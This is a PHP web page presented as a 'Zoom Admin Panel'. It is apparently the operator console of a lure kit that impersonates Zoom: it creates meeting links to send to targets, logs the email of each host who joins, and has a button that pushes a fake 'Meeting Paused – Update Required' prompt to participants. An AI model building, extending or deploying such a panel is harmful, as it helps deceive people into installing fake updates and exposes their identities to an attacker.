<?php
require_once dirname(__DIR__) . '/config.php';
session_start();

$error = '';
// Handle login
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
    if ($_POST['password'] === ADMIN_PASS) {
        $_SESSION[ADMIN_KEY] = true;
    } else {
        $error = 'Incorrect password.';
    }
}
// Handle logout
if (isset($_GET['logout'])) {
    unset($_SESSION[ADMIN_KEY]);
    header('Location: index.php'); exit;
}
$authed = !empty($_SESSION[ADMIN_KEY]);

// Handle AJAX actions
if ($authed && $_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
    header('Content-Type: application/json');
    $action = $_POST['action'];

    // Create meeting
    if ($action === 'create') {
        $id   = zm_meeting_id();
        $pass = zm_password();
        $meet = [
            'id'           => $id,
            'password'     => $pass,
            'created_at'   => time(),
            'status'       => 'waiting',
            'host_email'   => null,
            'host_joined'  => null,
            'admin_joined' => null,
        ];
        zm_save(zm_meet_file($id), $meet);
        zm_save(zm_sig_file($id), ['to_host'=>[],'to_admin'=>[]]);
        zm_save(zm_evt_file($id), ['update_push'=>false,'update_time'=>null]);
        $hostLink  = SITE_URL . '/join.php?m=' . $id;
        $adminLink = SITE_URL . '/room.php?m=' . $id . '&role=admin&p=' . $pass;
        echo json_encode(['ok'=>true,'id'=>$id,'host_link'=>$hostLink,'admin_link'=>$adminLink,'pass'=>$pass]);
        exit;
    }

    // Push update notification
    if ($action === 'push_update') {
        $id = preg_replace('/[^0-9\-]/', '', $_POST['m'] ?? '');
        if ($id && file_exists(zm_evt_file($id))) {
            zm_save(zm_evt_file($id), ['update_push'=>true,'update_time'=>time()]);
            echo json_encode(['ok'=>true]);
        } else {
            echo json_encode(['ok'=>false,'msg'=>'Meeting not found']);
        }
        exit;
    }

    // Cancel update
    if ($action === 'cancel_update') {
        $id = preg_replace('/[^0-9\-]/', '', $_POST['m'] ?? '');
        if ($id && file_exists(zm_evt_file($id))) {
            zm_save(zm_evt_file($id), ['update_push'=>false,'update_time'=>null]);
            echo json_encode(['ok'=>true]);
        }
        exit;
    }

    // End meeting
    if ($action === 'end') {
        $id = preg_replace('/[^0-9\-]/', '', $_POST['m'] ?? '');
        if ($id && file_exists(zm_meet_file($id))) {
            $m = zm_load(zm_meet_file($id));
            $m['status'] = 'ended';
            zm_save(zm_meet_file($id), $m);
            echo json_encode(['ok'=>true]);
        }
        exit;
    }

    // Delete meeting
    if ($action === 'delete') {
        $id = preg_replace('/[^0-9\-]/', '', $_POST['m'] ?? '');
        @unlink(zm_meet_file($id));
        @unlink(zm_sig_file($id));
        @unlink(zm_evt_file($id));
        echo json_encode(['ok'=>true]);
        exit;
    }

    // List meetings
    if ($action === 'list') {
        $files = glob(MEET_DIR . '/*.json') ?: [];
        $list  = [];
        foreach ($files as $f) {
            $m = zm_load($f);
            $e = zm_load(zm_evt_file($m['id'] ?? ''));
            $m['update_active'] = $e['update_push'] ?? false;
            $list[] = $m;
        }
        usort($list, fn($a,$b) => ($b['created_at']??0) - ($a['created_at']??0));
        echo json_encode(['ok'=>true,'meetings'=>$list]);
        exit;
    }

    echo json_encode(['ok'=>false]);
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Zoom Admin Panel</title>
<style>
*{box-sizing:border-box;margin:0;padding:0;}
:root{
  --bg:#0e0e10;--surface:#1a1a1d;--card:#222226;
  --border:#333;--blue:#2d8cff;--red:#f44;--green:#3dba6f;
  --orange:#ff9f0a;--text:#e8e8e8;--muted:#888;
}
body{background:var(--bg);color:var(--text);font-family:"Segoe UI",Arial,sans-serif;min-height:100vh;}

/* ── Login ── */
.login-wrap{display:flex;align-items:center;justify-content:center;min-height:100vh;}
.login-box{background:var(--surface);border:1px solid var(--border);border-radius:12px;
  padding:40px 36px;width:360px;text-align:center;}
.login-box .logo{display:flex;align-items:center;justify-content:center;gap:10px;margin-bottom:28px;}
.zm-logo{background:#2d8cff;color:#fff;font-size:22px;font-weight:800;
  width:42px;height:42px;border-radius:10px;display:flex;align-items:center;justify-content:center;}
.login-box h2{font-size:1.4rem;margin-bottom:6px;}
.login-box p{color:var(--muted);font-size:.85rem;margin-bottom:24px;}
.login-box input[type=password]{
  width:100%;padding:11px 14px;background:#111;border:1px solid var(--border);
  border-radius:8px;color:#fff;font-size:14px;margin-bottom:14px;outline:none;
}
.login-box input:focus{border-color:var(--blue);}
.btn{display:inline-flex;align-items:center;justify-content:center;gap:6px;
  padding:10px 18px;border-radius:8px;border:none;font-size:13px;font-weight:600;
  cursor:pointer;transition:opacity .15s;}
.btn:hover{opacity:.85;}
.btn-blue{background:var(--blue);color:#fff;width:100%;}
.btn-red{background:var(--red);color:#fff;}
.btn-green{background:var(--green);color:#fff;}
.btn-orange{background:var(--orange);color:#000;}
.btn-ghost{background:transparent;border:1px solid var(--border);color:var(--text);}
.btn-sm{padding:6px 12px;font-size:12px;}
.error-msg{background:#2d1111;border:1px solid #5c2020;border-radius:6px;
  padding:10px;font-size:13px;color:#f99;margin-bottom:14px;}

/* ── App layout ── */
#app{display:none;}
.topbar{background:var(--surface);border-bottom:1px solid var(--border);
  padding:12px 24px;display:flex;align-items:center;gap:12px;}
.topbar .logo{display:flex;align-items:center;gap:8px;font-weight:700;font-size:1rem;}
.topbar-right{margin-left:auto;display:flex;align-items:center;gap:10px;}
.badge{background:var(--blue);color:#fff;font-size:10px;font-weight:700;
  padding:2px 7px;border-radius:20px;}

.main{max-width:1100px;margin:0 auto;padding:28px 20px;}
.page-head{display:flex;align-items:center;justify-content:space-between;margin-bottom:24px;}
.page-head h1{font-size:1.3rem;font-weight:700;}

/* ── Meetings grid ── */
#meetings-wrap{display:grid;grid-template-columns:repeat(auto-fill,minmax(340px,1fr));gap:16px;}

.meet-card{
  background:var(--card);border:1px solid var(--border);
  border-radius:12px;padding:20px;position:relative;
  transition:border-color .2s;
}
.meet-card:hover{border-color:#555;}
.meet-card.active{border-color:var(--green);}
.meet-card.ended{opacity:.6;}
.meet-card.update-on{border-color:var(--orange);}

.meet-id{font-size:1.4rem;font-weight:700;letter-spacing:.05em;font-family:monospace;
  color:#fff;margin-bottom:4px;}
.meet-meta{font-size:.78rem;color:var(--muted);margin-bottom:14px;display:flex;gap:12px;flex-wrap:wrap;}
.meet-meta span{display:flex;align-items:center;gap:4px;}
.status-dot{width:7px;height:7px;border-radius:50%;background:var(--muted);display:inline-block;}
.status-dot.waiting{background:#888;}
.status-dot.active{background:var(--green);box-shadow:0 0 6px var(--green);}
.status-dot.ended{background:var(--red);}

.meet-host{background:#111;border-radius:8px;padding:10px 12px;margin-bottom:14px;font-size:.82rem;}
.meet-host .label{color:var(--muted);font-size:.72rem;text-transform:uppercase;letter-spacing:.06em;margin-bottom:3px;}

.meet-links{margin-bottom:14px;display:flex;flex-direction:column;gap:6px;}
.link-row{display:flex;gap:6px;align-items:center;}
.link-row span{font-size:.7rem;color:var(--muted);white-space:nowrap;}
.link-row input{
  flex:1;background:#111;border:1px solid var(--border);border-radius:6px;
  color:#aaa;font-size:.72rem;padding:5px 8px;outline:none;min-width:0;
}
.copy-btn{padding:5px 8px;font-size:.72rem;border-radius:5px;background:#2d2d30;
  border:1px solid var(--border);color:#ccc;cursor:pointer;white-space:nowrap;}
.copy-btn:hover{background:#3a3a3e;color:#fff;}

.meet-actions{display:flex;gap:8px;flex-wrap:wrap;}

.push-btn{
  background:linear-gradient(135deg,#ff6b00,#ff9f0a);
  color:#000;font-weight:700;border:none;border-radius:8px;
  padding:9px 14px;font-size:12px;cursor:pointer;flex:1;
  display:flex;align-items:center;justify-content:center;gap:5px;
  transition:opacity .15s;
}
.push-btn:hover{opacity:.85;}
.push-btn.active-push{background:linear-gradient(135deg,#333,#444);color:#888;}

.join-btn{background:var(--blue);color:#fff;border:none;border-radius:8px;
  padding:9px 14px;font-size:12px;cursor:pointer;font-weight:600;
  display:flex;align-items:center;gap:5px;transition:opacity .15s;}
.join-btn:hover{opacity:.85;}

.end-btn{background:#2d1111;border:1px solid var(--red);color:var(--red);
  border-radius:8px;padding:9px 12px;font-size:12px;cursor:pointer;font-weight:600;
  transition:opacity .15s;}
.end-btn:hover{background:#3d1515;}

.del-btn{background:transparent;border:1px solid var(--border);color:var(--muted);
  border-radius:8px;padding:9px 10px;font-size:12px;cursor:pointer;transition:opacity .15s;}
.del-btn:hover{border-color:var(--red);color:var(--red);}

/* ── Update badge ── */
.update-badge{
  position:absolute;top:14px;right:14px;
  background:var(--orange);color:#000;
  font-size:.65rem;font-weight:800;padding:3px 8px;border-radius:20px;
  display:none;animation:blink 1.5s infinite;
}
.meet-card.update-on .update-badge{display:inline-block;}
@keyframes blink{0%,100%{opacity:1}50%{opacity:.5}}

/* ── Empty state ── */
.empty-state{text-align:center;padding:60px 20px;color:var(--muted);}
.empty-state .icon{font-size:48px;margin-bottom:12px;}
.empty-state p{font-size:.9rem;}

/* ── Toast ── */
#toast{
  position:fixed;bottom:24px;left:50%;transform:translateX(-50%) translateY(80px);
  background:#222;border:1px solid var(--border);border-radius:8px;
  padding:12px 20px;font-size:13px;z-index:9999;
  transition:transform .3s cubic-bezier(.4,0,.2,1);white-space:nowrap;
}
#toast.show{transform:translateX(-50%) translateY(0);}
#toast.ok{border-color:var(--green);color:var(--green);}
#toast.err{border-color:var(--red);color:var(--red);}
</style>
</head>
<body>

<?php if (!$authed): ?>
<!-- ── LOGIN ── -->
<div class="login-wrap">
  <div class="login-box">
    <div class="logo"><div class="zm-logo">Z</div><span style="font-size:1.1rem;font-weight:700;">Zoom Admin</span></div>
    <h2>Sign in</h2>
    <p>Enter your admin password to continue</p>
    <?php if ($error): ?>
    <div class="error-msg"><?= htmlspecialchars($error) ?></div>
    <?php endif; ?>
    <form method="POST">
      <input type="password" name="password" placeholder="Admin password" autofocus>
      <button class="btn btn-blue" type="submit">Sign In</button>
    </form>
  </div>
</div>

<?php else: ?>
<!-- ── ADMIN APP ── -->
<div id="app" style="display:block;">
  <div class="topbar">
    <div class="logo">
      <div class="zm-logo">Z</div>
      Zoom Admin Panel
    </div>
    <div class="topbar-right">
      <span id="meetCount" class="badge">0 meetings</span>
      <a href="?logout=1" class="btn btn-ghost btn-sm">Sign Out</a>
    </div>
  </div>

  <div class="main">
    <div class="page-head">
      <h1>Meetings</h1>
      <button class="btn btn-blue" onclick="createMeeting()">+ New Meeting</button>
    </div>

    <div id="meetings-wrap">
      <div class="empty-state"><div class="icon">📹</div><p>No meetings yet.<br>Click <b>New Meeting</b> to get started.</p></div>
    </div>
  </div>
</div>
<?php endif; ?>

<div id="toast"></div>

<?php if ($authed): ?>
<script>
const SITE = <?= json_encode(SITE_URL) ?>;

// ── Toast ──────────────────────────────────────────────────────────────────────
function toast(msg, type='ok') {
  const t = document.getElementById('toast');
  t.textContent = msg;
  t.className = 'show ' + type;
  clearTimeout(t._tm);
  t._tm = setTimeout(() => t.className = '', 2800);
}

// ── Copy ───────────────────────────────────────────────────────────────────────
function copy(text) {
  navigator.clipboard.writeText(text).then(() => toast('Copied to clipboard ✓'));
}

// ── API call ──────────────────────────────────────────────────────────────────
async function api(params) {
  const fd = new FormData();
  for (const [k, v] of Object.entries(params)) fd.append(k, v);
  const r = await fetch('index.php', {method:'POST', body:fd});
  return r.json();
}

// ── Create meeting ────────────────────────────────────────────────────────────
async function createMeeting() {
  const d = await api({action:'create'});
  if (d.ok) {
    toast('Meeting ' + d.id + ' created ✓');
    loadMeetings();
  }
}

// ── Load meetings ─────────────────────────────────────────────────────────────
async function loadMeetings() {
  const d = await api({action:'list'});
  if (!d.ok) return;
  const wrap = document.getElementById('meetings-wrap');
  document.getElementById('meetCount').textContent = d.meetings.length + ' meeting' + (d.meetings.length !== 1 ? 's' : '');

  if (!d.meetings.length) {
    wrap.innerHTML = '<div class="empty-state"><div class="icon">📹</div><p>No meetings yet.<br>Click <b>New Meeting</b> to get started.</p></div>';
    return;
  }

  wrap.innerHTML = d.meetings.map(m => {
    const hostLink  = SITE + '/join.php?m=' + m.id;
    const adminLink = SITE + '/room.php?m=' + m.id + '&role=admin&p=' + m.password;
    const created   = new Date(m.created_at * 1000).toLocaleString();
    const statusClass = m.status === 'active' ? 'active' : m.status === 'ended' ? 'ended' : '';
    const cardClass   = statusClass + (m.update_active ? ' update-on' : '');
    const pushLabel   = m.update_active ? '⚠ Cancel Update' : '⚡ Push Update Notification';
    const pushClass   = m.update_active ? 'push-btn active-push' : 'push-btn';

    return `<div class="meet-card ${cardClass}" id="card-${m.id}">
      <div class="update-badge">UPDATE PUSHED</div>
      <div class="meet-id">${m.id}</div>
      <div class="meet-meta">
        <span><span class="status-dot ${m.status}"></span> ${m.status}</span>
        <span>🕒 ${created}</span>
        <span>🔑 ${m.password}</span>
      </div>
      <div class="meet-host">
        <div class="label">Host</div>
        ${m.host_email
          ? `<span style="color:#3dba6f">✓ ${m.host_email}</span>
             <span style="color:#888;font-size:.7rem;margin-left:8px;">joined ${new Date(m.host_joined*1000).toLocaleTimeString()}</span>`
          : '<span style="color:#666">Waiting for host to join…</span>'
        }
      </div>
      <div class="meet-links">
        <div class="link-row">
          <span>Host link</span>
          <input value="${hostLink}" readonly onclick="this.select()">
          <button class="copy-btn" onclick="copy('${hostLink}')">Copy</button>
        </div>
        <div class="link-row">
          <span>Your link</span>
          <input value="${adminLink}" readonly onclick="this.select()">
          <button class="copy-btn" onclick="copy('${adminLink}')">Copy</button>
        </div>
      </div>
      <div class="meet-actions">
        <button class="${pushClass}" onclick="pushUpdate('${m.id}', ${m.update_active})">${pushLabel}</button>
        <a href="${adminLink}" target="_blank" class="join-btn">📹 Join</a>
        ${m.status !== 'ended' ? `<button class="end-btn" onclick="endMeeting('${m.id}')">End</button>` : ''}
        <button class="del-btn" onclick="deleteMeeting('${m.id}')">🗑</button>
      </div>
    </div>`;
  }).join('');
}

// ── Push update ───────────────────────────────────────────────────────────────
async function pushUpdate(id, isActive) {
  if (isActive) {
    const d = await api({action:'cancel_update', m:id});
    if (d.ok) { toast('Update notification cancelled'); loadMeetings(); }
  } else {
    if (!confirm('Push "Meeting Paused – Update Required" notification to all participants?')) return;
    const d = await api({action:'push_update', m:id});
    if (d.ok) { toast('⚡ Update notification pushed to meeting ' + id, 'ok'); loadMeetings(); }
  }
}

// ── End / delete ──────────────────────────────────────────────────────────────
async function endMeeting(id) {
  if (!confirm('End meeting ' + id + '?')) return;
  await api({action:'end', m:id});
  toast('Meeting ended');
  loadMeetings();
}
async function deleteMeeting(id) {
  if (!confirm('Delete meeting ' + id + '? This cannot be undone.')) return;
  await api({action:'delete', m:id});
  toast('Meeting deleted');
  loadMeetings();
}

// ── Auto-refresh every 5s ─────────────────────────────────────────────────────
loadMeetings();
setInterval(loadMeetings, 5000);
</script>
<?php endif; ?>
</body>
</html>
